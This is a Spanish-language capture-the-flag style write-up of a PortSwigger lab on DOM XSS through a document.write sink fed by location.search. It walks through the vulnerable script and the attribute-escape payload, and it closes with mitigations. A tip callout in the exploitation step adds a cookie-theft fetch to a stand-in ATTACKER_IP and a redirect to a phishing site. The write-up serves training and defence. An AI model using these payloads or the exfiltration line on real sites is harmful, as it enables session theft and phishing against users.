---
title: "DOM XSS in document.write sink using source location.search"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "dom-xss-in-documentwrite-sink-using-source-locationsearch"
author: "Z4k7"
date: "2026-04-14"
year: "2026"
status: "pwned"
tags:
  - "Web_Security"
  - "BurpSuite"
  - "DOM"
techniques:
  - "DOM XSS"
  - "document.write sink"
  - "location.search source"
  - "WAF bypass"
tools:
  - "Browser DevTools"
  - "BurpSuite"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de BurpSuite Academy sobre DOM XSS usando document.write como sink y location.search como source. La vulnerabilidad radica en que JavaScript toma datos de la URL sin sanitizar y los escribe directamente en el DOM. Técnica: cerrar el atributo img para inyectar script. Cadena de ataque: reconocimiento → identificación de sink/source → prueba de escape → explotación con payload JavaScript.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios (XSS) basada en DOM en la funcionalidad de seguimiento de búsqueda. Utiliza JavaScript `document.write` función que escribe datos en la página. La función se llama con datos de `location.search`, que puedes controlar mediante la URL del sitio web.
          Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al `alert` función.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/file-20260414152141881.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultamos el código fuente de la web para validar el comportamiento del apartado de buscar. Nos basamos en la información del objetivo del laboratorio que menciona específicamente `document.write` y `location.search`.
      - kind: "code"
        lang: "HTML"
        code: |
          <section class=search>
           <form action=/ method=GET>
            <input type=text placeholder='Search the blog...' name=search>
            <button type=submit class=button>Search</button>
           </form>
          </section>
      - kind: "note"
        text: |
          En el análisis inicial no contamos con información directa en el código HTML visible sobre la aplicación de código arbitrario.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En DOM XSS, el código vulnerable está en JavaScript, no en HTML. El formulario activa un GET request, pero debes inspeccionar el código JavaScript de la página para encontrar dónde se procesa `location.search`. Usa DevTools → Sources o busca en la respuesta HTML scripts inline con `document.write`."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Enviamos una validación de etiqueta básica para tratar de consultar si contamos con manipulación en el DOM `<h1>Name<h1>`:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/file-20260414152710907.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          No contamos con afectación directa en el DOM, puede ser porque ya contamos con un `<H1>` anidando la respuesta. En este caso al momento de realizar el mismo proceso con otra etiqueta nos sale el mismo error:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/file-20260414153034375.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validando a profundidad el comportamiento de la búsqueda, se puede validar un script que aplica el proceso:
      - kind: "code"
        lang: "JS"
        code: |
          <script>
              function trackSearch(query) {
                  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
              }
              var query = (new URLSearchParams(window.location.search)).get('search');
              if(query) {
                  trackSearch(query);
              }
          </script>
      - kind: "note"
        text: |
          Al momento de buscar una palabra en el formulario se dispara una solicitud `GET` que crea una consulta en la URL con el contenido de `search`. El script toma dicha consulta y se dispara la `query`. Dado el caso que dispara la función, crea un nuevo elemento `img` y se agrega en el contenido del DOM.
      - kind: "callout"
        type: "warning"
        label: "Sink Identificado"
        text: "`document.write()` es un sink peligroso cuando maneja datos del usuario. Combined con `location.search` (source controlable) sin sanitización = DOM XSS garantizado."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es el patrón clásico de DOM XSS: source (location.search) → sin validación → sink (document.write). El navegador ejecuta el JavaScript que genera el HTML. A diferencia de Stored/Reflected XSS, esto pasa COMPLETAMENTE en el cliente — no hay servidor involucrado en la ejecución."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Lo que podemos realizar es, como toma la información de la URL y se almacena en la `query`, podemos tratar de cerrar la etiqueta `img` y salir del entorno usando `">`:
          Query: `">`
          El sistema lo toma de la siguiente manera:
      - kind: "code"
        lang: "HTML"
        code: |
          document.write('<img src="/resources/images/tracker.gif?searchTerms='">'">');
      - kind: "note"
        text: |
          El sistema lo toma como si finalizaras la etiqueta y el resto se toma como texto/comentario. Si enviamos esto se verá reflejado de la siguiente manera:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/file-20260414160812811.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos el código fuente:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/file-20260414160846521.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se confirma el proceso mencionado. En este caso ya podríamos aplicar el `"><script>alert(document.domain)</script>`:
          ![[../../../assets/images/DOM XSS in document.write sink using source location.search/file-20260414161229164.jpg]]
          ![[../../../assets/images/DOM XSS in document.write sink using source location.search/file-20260414161257423.jpg]]
          ![[../../../assets/images/DOM XSS in document.write sink using source location.search/file-20260414161306677.jpg]]
          ![[../../../assets/images/DOM XSS in document.write sink using source location.search/file-20260414161331271.jpg]]
      - kind: "callout"
        type: "info"
        label: "Payload Exitoso"
        text: "El payload `'><script>alert(document.domain)</script>` funciona porque: 1. `'>` cierra el atributo y la etiqueta img 2. `<script>` abre un nuevo bloque JavaScript 3. El código se ejecuta cuando document.write() procesa el string"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Conseguiste ejecutar JavaScript en el contexto del sitio web. En un ataque real, aquí es donde harías: `fetch('http://ATTACKER_IP/?cookie='+document.cookie)` para robar sesión, o `window.location='http://phishing-site.com'` para redirigir. La clave de DOM XSS es que todo pasa en el cliente — el servidor NUNCA ve el payload malicioso en la respuesta."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          ✅ Lab completado: El payload `"><script>alert(document.domain)</script>` se ejecutó correctamente inyectando JavaScript a través del sink `document.write()` con source `location.search`.

lessons:
  - 'DOM XSS vs Stored/Reflected: DOM XSS ocurre SOLO en el cliente. El servidor no ve el payload en responses. Por eso es más difícil de detectar con proxies como Burp — debes inspeccionar JavaScript manualmente.'
  - 'Source vs Sink: Identificar ambos es crítico. `location.search` es un source común. `document.write()`, `innerHTML`, `eval()` son sinks peligrosos.'
  - 'document.write() es especialmente peligroso: Escribe directamente en el HTML durante el parsing. No hace encoding.'
  - 'Escape de contexto: Cerrar atributos/tags (`">`) es la técnica fundamental para escapar y cambiar de contexto.'
  - 'URLSearchParams: Herramienta moderna para extraer parámetros de URL. Si procesa datos sin validar, es vulnerable.'
mitigation:
  - 'Validación de input: Whitelist de caracteres permitidos en parámetros de búsqueda (solo alfanuméricos, espacios, guiones).'
  - 'Encoding de output: Si DEBES usar `document.write()`, escapar caracteres especiales antes (`<` → `&lt;`, `>` → `&gt;`, etc.).'
  - 'Usar APIs seguras: Reemplazar `document.write()` con `textContent` (no parsea HTML) en lugar de `innerHTML` cuando sea posible.'
  - 'Content Security Policy (CSP): `script-src ''self''` bloquearía scripts inline inyectados.'
  - 'Validación en ambos lados: Validar en cliente (UX) pero SIEMPRE validar en servidor (seguridad).'
  - 'Evitar location.search directamente: Procesar parámetros a través de validación explícita, no concatenación directa.'
---
